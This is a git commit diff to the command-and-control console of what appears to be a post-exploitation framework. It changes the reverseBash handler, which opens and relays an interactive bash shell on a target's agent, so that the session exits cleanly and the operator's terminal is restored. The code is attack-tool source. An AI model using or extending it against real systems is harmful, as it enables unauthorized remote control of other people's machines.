dac85e30bbef86ee3fa907638292a62798281cdb
jm33-m0 <jm33.m0@gmail.com>
2020-02-19 15:31:30 +0800

    exit reverse shell cleanly

--- core/internal/cc/rshell.go
+++ core/internal/cc/rshell.go
@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"strings"
 	"syscall"
 
 	"github.com/creack/pty"
@@ -21,6 +22,9 @@ func reverseBash() {
 		return
 	}
 
+	// indicates when to exit
+	isExit := false
+
 	// activate reverse shell in agent
 	err := SendCmd("bash", CurrentTarget)
 	if err != nil {
@@ -34,35 +38,57 @@ func reverseBash() {
 		CliPrintError("Cannot open /dev/tty: %v", err)
 	}
 
+	// back up terminal settings using `stty -g`
+	out, err := exec.Command("stty", "-F", "/dev/tty", "-g").CombinedOutput()
+	if err != nil {
+		CliPrintError("Cannot save current terminal settings: %v\n%s", err, out)
+	}
+	oldTerm := strings.TrimSpace(string(out))
+
 	cleanup := func() {
-		out, err := exec.Command("stty", "-F", "/dev/tty", "sane").CombinedOutput()
+		out, err := exec.Command("stty", "-F", "/dev/tty", oldTerm).CombinedOutput()
 		if err != nil {
 			CliPrintError("failed to restore terminal: %v\n%s", err, out)
 		}
+		err = ttyf.Close()
+		if err != nil {
+			CliPrintWarning("Closing /dev/tty: %v", err)
+		}
 
-		err = agent.CCStream.Close()
+		err = agent.H2Stream.Close()
 		if err != nil {
 			CliPrintWarning("Closing reverse shell connection: ", err)
 		}
+		CliPrintWarning("Cleaned up reverseBash")
 	}
 	defer cleanup()
 
 	// receive and display bash's output
 	go func() {
-		for incoming := range RecvAgentBuf {
+		for incoming := range RecvAgent {
+			if isExit {
+				return
+			}
+
 			os.Stdout.Write(incoming)
 		}
 	}()
 
 	// send whatever input to target's bash
 	go func() {
-		for outgoing := range SendAgentBuf {
-			if agent.CCStream == nil {
+		for outgoing := range SendAgent {
+			if isExit {
+				return
+			}
+
+			if agent.H2Stream == nil {
 				continue
 			}
-			_, err = agent.CCStream.Write(outgoing)
+			_, err = agent.H2Stream.Write(outgoing)
 			if err != nil {
 				log.Print("Send to remote: ", err)
+				isExit = true
+				return
 			}
 		}
 	}()
@@ -75,6 +101,10 @@ func reverseBash() {
 	signal.Notify(ch, syscall.SIGWINCH)
 	go func() {
 		for range ch {
+			if isExit {
+				return
+			}
+
 			if err := pty.InheritSize(os.Stdin, ttyf); err != nil {
 				log.Printf("error resizing pty: %s", err)
 			}
@@ -83,29 +113,31 @@ func reverseBash() {
 			winSize, err := pty.GetsizeFull(os.Stdin)
 			if err != nil {
 				CliPrintWarning("Cannot get terminal size: %v", err)
+				isExit = true
+				return
 			}
 			setupTermCmd := fmt.Sprintf("stty rows %d columns %d\n",
 				winSize.Rows, winSize.Cols)
-			SendAgentBuf <- []byte(setupTermCmd)
+			SendAgent <- []byte(setupTermCmd)
 		}
 	}()
 	ch <- syscall.SIGWINCH // Initial resize.
 
+	// resize remote terminal to match local
 	currentWinSize, err := pty.GetsizeFull(os.Stdin)
 	if err != nil {
 		CliPrintWarning("Cannot get terminal size: %v", err)
 	}
+	setupTermCmd := fmt.Sprintf("stty rows %d columns %d;reset\n",
+		currentWinSize.Rows, currentWinSize.Cols)
+	SendAgent <- []byte(setupTermCmd)
 
 	// switch to raw mode
-	out, err := exec.Command("stty", "-F", "/dev/tty", "raw", "-echo").CombinedOutput()
+	out, err = exec.Command("stty", "-F", "/dev/tty", "raw", "-echo").CombinedOutput()
 	if err != nil {
 		CliPrintError("stty raw mode failed: %v\n%s", err, out)
 		return
 	}
-
-	setupTermCmd := fmt.Sprintf("stty rows %d columns %d;reset\n",
-		currentWinSize.Rows, currentWinSize.Cols)
-	SendAgentBuf <- []byte(setupTermCmd)
 
 	for {
 		// read stdin
@@ -114,16 +146,19 @@ func reverseBash() {
 		_, err := consoleReader.Read(buf)
 		if err != nil {
 			CliPrintWarning("Bash read input: %v", err)
+			isExit = true
+			break
 		}
 		if buf[0] == 4 { // Ctrl-D is 4
 			color.Red("EOF")
+			isExit = true
 			break
 		}
 
 		// send our byte
-		SendAgentBuf <- buf
+		SendAgent <- buf
 	}
 
 	// always send 'exit' to correctly log out our bash shell
-	SendAgentBuf <- []byte("exit\n\n")
+	SendAgent <- []byte("exit\n\n")
 }
